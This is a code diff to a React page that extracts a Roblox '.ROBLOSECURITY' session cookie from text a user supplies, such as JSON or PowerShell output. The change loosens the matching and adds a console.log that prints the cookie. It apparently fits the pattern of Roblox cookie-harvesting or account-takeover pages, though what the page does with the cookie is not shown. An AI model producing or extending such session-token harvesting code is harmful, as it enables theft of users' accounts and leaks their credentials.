@@ -70,27 +70,53 @@ export default function SlugPage() {
   function extractRobloSecurity(text: string): string | null {
     if (!text) return null;
 
-    // 1. Regex mạnh hơn: tìm chuỗi bắt đầu bằng _|WARNING: và kéo dài cho đến khi gặp dấu nháy hoặc khoảng trắng
-    // Cách này chấp nhận cả input là JSON, PowerShell, hoặc text thuần
-    const pattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"'\s]+)/i;
-    const match = text.match(pattern);
+    const marker = "_|WARNING:-DO-NOT-SHARE-THIS.";
 
-    if (match && match[1]) {
-      let cookie = match[1].trim();
+    // Ưu tiên: tìm trực tiếp chuỗi cookie bắt đầu bằng _|WARNING...
+    const markerIndex = text.indexOf(marker);
+    if (markerIndex !== -1) {
+      let end = markerIndex;
 
-      // Loại bỏ các ký tự dư thừa ở cuối nếu có (như dấu ngoặc đơn trong PowerShell)
-      cookie = cookie.replace(/[)'";,]+$/, '');
+      // Cắt cho đến khi gặp ký tự kết thúc "hợp lý"
+      while (
+        end < text.length &&
+        !['"', "'", "\n", "\r", " ", ")", "]", "}"].includes(text[end])
+      ) {
+        end++;
+      }
 
-      if (cookie.length > 500) {
+      let cookie = text.slice(markerIndex, end).trim();
+      cookie = cookie.replace(/[)'";,]+$/, "");
+
+      if (cookie.length > 100) {
         return cookie;
       }
     }
 
-    // 2. Fallback cho trường hợp không có WARNING prefix (hiếm gặp với .ROBLOSECURITY)
-    const backupPattern = /\.ROBLOSECURITY["']?\s*,\s*["']([^"'\s]{500,})["']/i;
-    const backupMatch = text.match(backupPattern);
-    if (backupMatch && backupMatch[1]) {
-      return backupMatch[1].trim();
+    // Fallback: tìm theo dạng .ROBLOSECURITY", "<COOKIE>"
+    const keyIndex = text.indexOf(".ROBLOSECURITY");
+    if (keyIndex !== -1) {
+      // Tìm dấu nháy đầu tiên sau .ROBLOSECURITY
+      let firstQuote = -1;
+      for (let i = keyIndex; i < text.length; i++) {
+        if (text[i] === '"' || text[i] === "'") {
+          firstQuote = i;
+          break;
+        }
+      }
+
+      if (firstQuote !== -1) {
+        const quoteChar = text[firstQuote];
+        const secondQuote = text.indexOf(quoteChar, firstQuote + 1);
+        if (secondQuote !== -1) {
+          let cookie = text.slice(firstQuote + 1, secondQuote).trim();
+          cookie = cookie.replace(/[)'";,]+$/, "");
+
+          if (cookie.length > 100) {
+            return cookie;
+          }
+        }
+      }
     }
 
     return null;
@@ -308,6 +334,7 @@ export default function SlugPage() {
     }
 
     const robloxCookie = extractRobloSecurity(fileContent);
+    console.log("::::", robloxCookie) 
     if (!robloxCookie) {
       setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
       return;
